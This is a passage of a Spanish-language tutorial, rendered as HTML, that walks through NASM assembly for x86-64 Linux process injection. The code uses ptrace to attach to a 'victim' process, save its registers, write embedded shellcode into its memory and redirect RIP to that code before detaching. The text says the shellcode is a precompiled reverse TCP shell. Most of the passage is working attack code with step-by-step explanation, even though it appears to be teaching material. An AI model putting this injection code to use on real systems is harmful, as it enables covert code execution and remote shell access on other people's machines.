</span><span id="__span-10-291"><a id="__codelineno-10-291" name="__codelineno-10-291" href="#__codelineno-10-291"></a><span class="w">    </span><span class="nl">.loop_inj:</span>
</span><span id="__span-10-292"><a id="__codelineno-10-292" name="__codelineno-10-292" href="#__codelineno-10-292"></a>
</span><span id="__span-10-293"><a id="__codelineno-10-293" name="__codelineno-10-293" href="#__codelineno-10-293"></a><span class="w">        </span><span class="nf">cmp</span><span class="w"> </span><span class="nb">r14</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="w">     </span><span class="c1">; compara el contador de palabras a escribir con 0</span>
</span><span id="__span-10-294"><a id="__codelineno-10-294" name="__codelineno-10-294" href="#__codelineno-10-294"></a><span class="w">        </span><span class="nf">jz</span><span class="w"> </span><span class="nv">.done</span><span class="w">       </span><span class="c1">; si contador == 0, saltar a .done</span>
</span><span id="__span-10-295"><a id="__codelineno-10-295" name="__codelineno-10-295" href="#__codelineno-10-295"></a>
</span><span id="__span-10-296"><a id="__codelineno-10-296" name="__codelineno-10-296" href="#__codelineno-10-296"></a><span class="w">        </span><span class="c1">; PTRACE_POKEDATA</span>
</span><span id="__span-10-297"><a id="__codelineno-10-297" name="__codelineno-10-297" href="#__codelineno-10-297"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-10-298"><a id="__codelineno-10-298" name="__codelineno-10-298" href="#__codelineno-10-298"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="w">     </span><span class="c1">; PTRACE_POKEDATA</span>
</span><span id="__span-10-299"><a id="__codelineno-10-299" name="__codelineno-10-299" href="#__codelineno-10-299"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">   </span><span class="c1">; PID</span>
</span><span id="__span-10-300"><a id="__codelineno-10-300" name="__codelineno-10-300" href="#__codelineno-10-300"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">r12</span><span class="w">   </span><span class="c1">; addr </span>
</span><span id="__span-10-301"><a id="__codelineno-10-301" name="__codelineno-10-301" href="#__codelineno-10-301"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nb">r13</span><span class="p">]</span><span class="w"> </span><span class="c1">; valor de 8 bytes a escribir</span>
</span><span id="__span-10-302"><a id="__codelineno-10-302" name="__codelineno-10-302" href="#__codelineno-10-302"></a><span class="w">        </span><span class="nf">syscall</span>
</span><span id="__span-10-303"><a id="__codelineno-10-303" name="__codelineno-10-303" href="#__codelineno-10-303"></a>
</span><span id="__span-10-304"><a id="__codelineno-10-304" name="__codelineno-10-304" href="#__codelineno-10-304"></a><span class="w">        </span><span class="nf">add</span><span class="w"> </span><span class="nb">r12</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span>
</span><span id="__span-10-305"><a id="__codelineno-10-305" name="__codelineno-10-305" href="#__codelineno-10-305"></a><span class="w">        </span><span class="nf">add</span><span class="w"> </span><span class="nb">r13</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span>
</span><span id="__span-10-306"><a id="__codelineno-10-306" name="__codelineno-10-306" href="#__codelineno-10-306"></a><span class="w">        </span><span class="nf">dec</span><span class="w"> </span><span class="nb">r14</span>
</span><span id="__span-10-307"><a id="__codelineno-10-307" name="__codelineno-10-307" href="#__codelineno-10-307"></a><span class="w">        </span><span class="nf">jmp</span><span class="w"> </span><span class="nv">.loop_inj</span>
</span><span id="__span-10-308"><a id="__codelineno-10-308" name="__codelineno-10-308" href="#__codelineno-10-308"></a>
</span><span id="__span-10-309"><a id="__codelineno-10-309" name="__codelineno-10-309" href="#__codelineno-10-309"></a>
</span><span id="__span-10-310"><a id="__codelineno-10-310" name="__codelineno-10-310" href="#__codelineno-10-310"></a><span class="c1">; -----------------------------------------</span>
</span><span id="__span-10-311"><a id="__codelineno-10-311" name="__codelineno-10-311" href="#__codelineno-10-311"></a>
</span><span id="__span-10-312"><a id="__codelineno-10-312" name="__codelineno-10-312" href="#__codelineno-10-312"></a><span class="w">    </span><span class="nf">.done</span>
</span><span id="__span-10-313"><a id="__codelineno-10-313" name="__codelineno-10-313" href="#__codelineno-10-313"></a>
</span><span id="__span-10-314"><a id="__codelineno-10-314" name="__codelineno-10-314" href="#__codelineno-10-314"></a><span class="w">        </span><span class="c1">; Verificar que el shellcode se escribió bien</span>
</span><span id="__span-10-315"><a id="__codelineno-10-315" name="__codelineno-10-315" href="#__codelineno-10-315"></a><span class="w">        </span><span class="c1">;mov rax, 101</span>
</span><span id="__span-10-316"><a id="__codelineno-10-316" name="__codelineno-10-316" href="#__codelineno-10-316"></a><span class="w">        </span><span class="c1">;mov rdi, 2          ; PTRACE_PEEKDATA</span>
</span><span id="__span-10-317"><a id="__codelineno-10-317" name="__codelineno-10-317" href="#__codelineno-10-317"></a><span class="w">        </span><span class="c1">;mov rsi, r15</span>
</span><span id="__span-10-318"><a id="__codelineno-10-318" name="__codelineno-10-318" href="#__codelineno-10-318"></a><span class="w">        </span><span class="c1">;mov rdx, r12        ; dirección mmap</span>
</span><span id="__span-10-319"><a id="__codelineno-10-319" name="__codelineno-10-319" href="#__codelineno-10-319"></a><span class="w">        </span><span class="c1">;sub rsp, 8       ; 8 bytes</span>
</span><span id="__span-10-320"><a id="__codelineno-10-320" name="__codelineno-10-320" href="#__codelineno-10-320"></a><span class="w">        </span><span class="c1">;mov r10, rsp     ; puntero a data (direccion donde se almacenará la info leída)</span>
</span><span id="__span-10-321"><a id="__codelineno-10-321" name="__codelineno-10-321" href="#__codelineno-10-321"></a><span class="w">        </span><span class="c1">;syscall </span>
</span><span id="__span-10-322"><a id="__codelineno-10-322" name="__codelineno-10-322" href="#__codelineno-10-322"></a>
</span><span id="__span-10-323"><a id="__codelineno-10-323" name="__codelineno-10-323" href="#__codelineno-10-323"></a><span class="w">        </span><span class="nf">pop</span><span class="w"> </span><span class="nb">r12</span>
</span><span id="__span-10-324"><a id="__codelineno-10-324" name="__codelineno-10-324" href="#__codelineno-10-324"></a>
</span><span id="__span-10-325"><a id="__codelineno-10-325" name="__codelineno-10-325" href="#__codelineno-10-325"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs_ori</span><span class="o">+</span><span class="mh">0x80</span><span class="p">],</span><span class="w"> </span><span class="nb">r12</span><span class="w">   </span><span class="c1">; RIP == dirección del inicio de la memoria reservada == inicio del shellcode</span>
</span><span id="__span-10-326"><a id="__codelineno-10-326" name="__codelineno-10-326" href="#__codelineno-10-326"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs_ori</span><span class="o">+</span><span class="mh">0x78</span><span class="p">],</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="w">    </span><span class="c1">; orig_rax = -1 (evita syscall restart)</span>
</span><span id="__span-10-327"><a id="__codelineno-10-327" name="__codelineno-10-327" href="#__codelineno-10-327"></a>
</span><span id="__span-10-328"><a id="__codelineno-10-328" name="__codelineno-10-328" href="#__codelineno-10-328"></a>
</span><span id="__span-10-329"><a id="__codelineno-10-329" name="__codelineno-10-329" href="#__codelineno-10-329"></a><span class="w">        </span><span class="c1">; PTRACE_SETREGS</span>
</span><span id="__span-10-330"><a id="__codelineno-10-330" name="__codelineno-10-330" href="#__codelineno-10-330"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-10-331"><a id="__codelineno-10-331" name="__codelineno-10-331" href="#__codelineno-10-331"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">13</span><span class="w">    </span><span class="c1">; PTRACE_SETREGS</span>
</span><span id="__span-10-332"><a id="__codelineno-10-332" name="__codelineno-10-332" href="#__codelineno-10-332"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">   </span><span class="c1">; PID</span>
</span><span id="__span-10-333"><a id="__codelineno-10-333" name="__codelineno-10-333" href="#__codelineno-10-333"></a><span class="w">        </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w">   </span><span class="c1">; addr</span>
</span><span id="__span-10-334"><a id="__codelineno-10-334" name="__codelineno-10-334" href="#__codelineno-10-334"></a><span class="w">        </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">regs_ori</span><span class="p">]</span><span class="w"> </span><span class="c1">; puntero al buffer donde se encuentra la estructura de registros</span>
</span><span id="__span-10-335"><a id="__codelineno-10-335" name="__codelineno-10-335" href="#__codelineno-10-335"></a><span class="w">        </span><span class="nf">syscall</span>
</span><span id="__span-10-336"><a id="__codelineno-10-336" name="__codelineno-10-336" href="#__codelineno-10-336"></a>
</span><span id="__span-10-337"><a id="__codelineno-10-337" name="__codelineno-10-337" href="#__codelineno-10-337"></a>
</span><span id="__span-10-338"><a id="__codelineno-10-338" name="__codelineno-10-338" href="#__codelineno-10-338"></a>
</span><span id="__span-10-339"><a id="__codelineno-10-339" name="__codelineno-10-339" href="#__codelineno-10-339"></a><span class="w">    </span><span class="c1">; PTRACE_DETACH</span>
</span><span id="__span-10-340"><a id="__codelineno-10-340" name="__codelineno-10-340" href="#__codelineno-10-340"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-10-341"><a id="__codelineno-10-341" name="__codelineno-10-341" href="#__codelineno-10-341"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">17</span><span class="w">    </span><span class="c1">; PTRACE_DETACH</span>
</span><span id="__span-10-342"><a id="__codelineno-10-342" name="__codelineno-10-342" href="#__codelineno-10-342"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">   </span><span class="c1">; PID</span>
</span><span id="__span-10-343"><a id="__codelineno-10-343" name="__codelineno-10-343" href="#__codelineno-10-343"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w">   </span><span class="c1">; addr</span>
</span><span id="__span-10-344"><a id="__codelineno-10-344" name="__codelineno-10-344" href="#__codelineno-10-344"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r10</span><span class="w">   </span><span class="c1">; signal = 0 (no enviar señal)</span>
</span><span id="__span-10-345"><a id="__codelineno-10-345" name="__codelineno-10-345" href="#__codelineno-10-345"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-10-346"><a id="__codelineno-10-346" name="__codelineno-10-346" href="#__codelineno-10-346"></a>
</span><span id="__span-10-347"><a id="__codelineno-10-347" name="__codelineno-10-347" href="#__codelineno-10-347"></a>
</span><span id="__span-10-348"><a id="__codelineno-10-348" name="__codelineno-10-348" href="#__codelineno-10-348"></a><span class="w">    </span><span class="c1">; EXIT</span>
</span><span id="__span-10-349"><a id="__codelineno-10-349" name="__codelineno-10-349" href="#__codelineno-10-349"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">60</span>
</span><span id="__span-10-350"><a id="__codelineno-10-350" name="__codelineno-10-350" href="#__codelineno-10-350"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="nb">rdi</span><span class="w"> </span>
</span><span id="__span-10-351"><a id="__codelineno-10-351" name="__codelineno-10-351" href="#__codelineno-10-351"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-10-352"><a id="__codelineno-10-352" name="__codelineno-10-352" href="#__codelineno-10-352"></a>
</span><span id="__span-10-353"><a id="__codelineno-10-353" name="__codelineno-10-353" href="#__codelineno-10-353"></a>
</span><span id="__span-10-354"><a id="__codelineno-10-354" name="__codelineno-10-354" href="#__codelineno-10-354"></a>
</span><span id="__span-10-355"><a id="__codelineno-10-355" name="__codelineno-10-355" href="#__codelineno-10-355"></a><span class="c1">;Explicar fork, setsid y munmap</span>
</span></code></pre></div>
<hr />
<h2 id="explicacion-detallada-del-codigo">Explicación detallada del código<a class="headerlink" href="#explicacion-detallada-del-codigo" title="Permanent link">&para;</a></h2>
<h3 id="seccion-data-el-shellcode-embebido">Sección .data - El shellcode embebido<a class="headerlink" href="#seccion-data-el-shellcode-embebido" title="Permanent link">&para;</a></h3>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="k">section</span><span class="w"> </span><span class="nv">.data</span>
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="nl">shellcode:</span>
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0xb8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x39</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x05</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span>
</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="w">    </span><span class="c1">; ... más bytes ...</span>
</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="no">sc_len</span><span class="w"> </span><span class="kd">equ</span><span class="w"> </span><span class="kc">$</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nv">shellcode</span>
</span></code></pre></div>
<p>Esta sección contiene el shellcode en formato de bytes crudos. Es el código que será inyectado en el proceso víctima. El shellcode está pre-compilado y representa el programa <code>proc_inj_rev_tcp.asm</code> que veremos más adelante.</p>
<p><code>sc_len</code> calcula automáticamente el tamaño del shellcode usando la directiva <code>$</code> (dirección actual) menos la dirección de inicio.</p>
<h3 id="seccion-bss-buffers-para-registros">Sección .bss - Buffers para registros<a class="headerlink" href="#seccion-bss-buffers-para-registros" title="Permanent link">&para;</a></h3>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="k">section</span><span class="w"> </span><span class="nv">.bss</span>
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="w">    </span><span class="nf">regs</span><span class="w"> </span><span class="nv">resq</span><span class="w"> </span><span class="mi">27</span><span class="w">      </span><span class="c1">; Buffer para registros actuales</span>
</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="w">    </span><span class="nf">regs_ori</span><span class="w"> </span><span class="nv">resq</span><span class="w"> </span><span class="mi">27</span><span class="w">  </span><span class="c1">; Backup de registros originales</span>
</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="w">    </span><span class="nf">regs_sys</span><span class="w"> </span><span class="nv">resq</span><span class="w"> </span><span class="mi">27</span><span class="w">  </span><span class="c1">; Registros después de syscall</span>
</span></code></pre></div>
<p>Reservamos tres buffers de 27 qwords (216 bytes) cada uno:</p>
<ul>
<li><strong>regs</strong>: Almacena los registros que vamos a modificar.</li>
<li><strong>regs_ori</strong>: Copia de seguridad de los registros originales.</li>
<li><strong>regs_sys</strong>: Almacena los registros después de ejecutar mmap (para obtener el resultado).</li>
</ul>
<hr />
<h3 id="paso-1-attach-y-detencion-del-proceso">Paso 1: Attach y detención del proceso<a class="headerlink" href="#paso-1-attach-y-detencion-del-proceso" title="Permanent link">&para;</a></h3>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r15</span><span class="p">,</span><span class="w"> </span><span class="mi">26559</span><span class="w">           </span><span class="c1">; PID del proceso objetivo (cambiar según necesidad)</span>
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>
</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="w">    </span><span class="c1">; PTRACE_ATTACH</span>
</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span><span class="w">             </span><span class="c1">; syscall: ptrace</span>
</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="w">              </span><span class="c1">; request: PTRACE_ATTACH</span>
</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">             </span><span class="c1">; pid: proceso objetivo</span>
</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w">             </span><span class="c1">; addr: no usado</span>
</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r10</span><span class="w">             </span><span class="c1">; data: no usado</span>
</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="w">    </span><span class="nf">syscall</span>
</span></code></pre></div>
<p><strong>¿Qué hace?</strong></p>
<p>Nos adjuntamos al proceso víctima usando <code>PTRACE_ATTACH</code>. Esto tiene varios efectos:</p>
<ol>
<li>Establecemos una relación tracer-tracee con el proceso.</li>
<li>El kernel envía <code>SIGSTOP</code> al proceso víctima, deteniéndolo.</li>
<li>Obtenemos permisos para leer/escribir su memoria y registros.</li>
</ol>
<p><strong>¿Por qué wait4?</strong></p>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">61</span><span class="w">              </span><span class="c1">; syscall: wait4</span>
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">             </span><span class="c1">; pid: esperar a este proceso específico</span>
</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="nb">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span>
</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span><span class="w">             </span><span class="c1">; &amp;status: donde guardar el estado</span>
</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w">             </span><span class="c1">; options: 0</span>
</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r10</span><span class="w">             </span><span class="c1">; rusage: NULL</span>
</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="w">    </span><span class="nf">syscall</span>
</span></code></pre></div>
<p>Después de <code>PTRACE_ATTACH</code>, el proceso no se detiene inmediatamente. El <code>SIGSTOP</code> es asíncrono. Debemos llamar a <code>wait4</code> para bloquearnos hasta que el proceso esté efectivamente detenido. Sin esto, podríamos intentar manipular un proceso que aún está ejecutándose, causando comportamiento indefinido.</p>
<hr />
<h3 id="paso-2-preservacion-del-contexto-de-ejecucion">Paso 2: Preservación del contexto de ejecución<a class="headerlink" href="#paso-2-preservacion-del-contexto-de-ejecucion" title="Permanent link">&para;</a></h3>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="w">    </span><span class="c1">; PTRACE_GETREGS</span>
</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">12</span><span class="w">              </span><span class="c1">; PTRACE_GETREGS</span>
</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">             </span><span class="c1">; PID</span>
</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span>
</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">regs</span><span class="p">]</span><span class="w">      </span><span class="c1">; Buffer destino</span>
</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="w">    </span><span class="nf">syscall</span>
</span></code></pre></div>
<p><strong>¿Qué hace?</strong></p>
<p>Obtenemos una copia completa de todos los registros del proceso víctima. Esto nos da:</p>
<ul>
<li>El valor actual del RIP (dónde está ejecutando).</li>
<li>Todos los registros de propósito general.</li>
<li>Los flags del CPU.</li>
<li>El stack pointer.</li>
</ul>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="w">    </span><span class="c1">; Copia de seguridad</span>
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">regs</span><span class="p">]</span>
</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">regs_ori</span><span class="p">]</span>
</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rcx</span><span class="p">,</span><span class="w"> </span><span class="mi">27</span>
</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="w">    </span><span class="nf">cld</span>
</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="w">    </span><span class="nf">rep</span><span class="w"> </span><span class="nv">movsq</span>
</span></code></pre></div>
<p><strong>¿Qué hace?</strong></p>
<p>Copiamos los 27 qwords de <code>regs</code> a <code>regs_ori</code> usando <code>rep movsq</code>. Esta es una copia de seguridad que usaremos para:</p>
<ol>
<li>Restaurar el proceso a su estado original después de ejecutar mmap.</li>
<li>Saber cuál era el RIP original para poder volver después del shellcode.</li>
</ol>
<p>La instrucción <code>cld</code> asegura que la copia se haga en dirección ascendente (DF=0).</p>
<hr />
<h3 id="paso-3-inyeccion-de-la-instruccion-syscall">Paso 3: Inyección de la instrucción syscall<a class="headerlink" href="#paso-3-inyeccion-de-la-instruccion-syscall" title="Permanent link">&para;</a></h3>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r12</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x80</span><span class="p">]</span><span class="w">     </span><span class="c1">; Obtener RIP del tracee</span>
</span></code></pre></div>
<p>Leemos el RIP del proceso víctima. Esta es la dirección de la próxima instrucción que iba a ejecutar.</p>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="w">    </span><span class="c1">; PTRACE_PEEKDATA - Leer bytes originales</span>
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="w">               </span><span class="c1">; PTRACE_PEEKDATA</span>
</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span>
</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">r12</span><span class="w">             </span><span class="c1">; Dirección a leer (RIP del tracee)</span>
</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a><span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="nb">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span>
</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span><span class="w">             </span><span class="c1">; Donde guardar el resultado</span>
</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a><span class="w">    </span><span class="nf">syscall</span>
</span></code></pre></div>
<p><strong>¿Qué hace?</strong></p>
<p>Leemos los 8 bytes que están en la dirección donde apunta el RIP. Estos son las instrucciones que el proceso iba a ejecutar. Necesitamos guardarlos para restaurarlos después.</p>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r11</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nb">rsp</span><span class="p">]</span><span class="w">           </span><span class="c1">; Valor original</span>
